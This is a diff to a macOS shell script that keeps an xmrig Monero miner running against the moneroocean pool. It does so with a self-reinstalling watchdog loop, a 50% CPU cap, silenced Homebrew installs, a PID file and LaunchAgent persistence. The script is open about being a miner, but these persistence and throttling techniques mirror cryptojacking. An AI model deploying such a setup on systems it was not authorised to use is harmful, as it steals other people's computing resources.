@@ -30,18 +30,14 @@ POOL="pool.moneroocean.stream:10001"
 WORKER="mac_miner"
 LOGDIR="$HOME/Library/Logs"
 LOGFILE="$LOGDIR/miner.log"
+PIDFILE="$HOME/.xmrig.pid"
 
 mkdir -p "$LOGDIR"
 
 while true; do
   # reinstall xmrig if missing
   if ! command -v xmrig >/dev/null 2>&1; then
-    if ! brew list xmrig >/dev/null 2>&1; then
-      brew install xmrig >/dev/null 2>&1 || {
-        FORMULA=$(brew search xmrig | head -n1)
-        [ -n "$FORMULA" ] && brew install "$FORMULA" >/dev/null 2>&1 || true
-      }
-    fi
+    brew install xmrig >/dev/null 2>&1 || true
   fi
 
   # reinstall cpulimit if missing
@@ -51,22 +47,33 @@ while true; do
 
   # delete log if too large (>50MB)
   if [ -f "$LOGFILE" ] && [ $(du -m "$LOGFILE" | cut -f1) -gt 50 ]; then
-    rm -f "$LOGFILE"
+    mv "$LOGFILE" "$LOGFILE.$(date +%Y%m%d-%H%M%S).old"
   fi
 
-  # run xmrig capped at 50% CPU
+  # check if xmrig already running
+  if [ -f "$PIDFILE" ]; then
+    PID=$(cat "$PIDFILE" || true)
+    if [ -n "$PID" ] && ps -p "$PID" -o comm= | grep -q "^xmrig$"; then
+      sleep 10
+      continue
+    else
+      rm -f "$PIDFILE"
+    fi
+  fi
+
+  # run xmrig capped at 50% CPU, log to file
   nohup cpulimit -l 50 xmrig \
     --url=$POOL \
     --user=$WALLET \
     --pass=$WORKER \
-    --background \
     --donate-level=1 \
+    --log-file=$LOGFILE \
     >> "$LOGFILE" 2>&1 &
-
-  miner_pid=$!
+  echo $! > "$PIDFILE"
 
   # wait for miner to exit
-  wait $miner_pid || true
+  wait $(cat "$PIDFILE") || true
+  rm -f "$PIDFILE"
 
   # sleep briefly before restart
   sleep 5
@@ -102,4 +109,5 @@ cat > "$PLIST" <<EOF
 EOF
 
 # load LaunchAgent immediately
+launchctl unload "$PLIST" >/dev/null 2>&1 || true
 launchctl load "$PLIST" >/dev/null 2>&1 || true
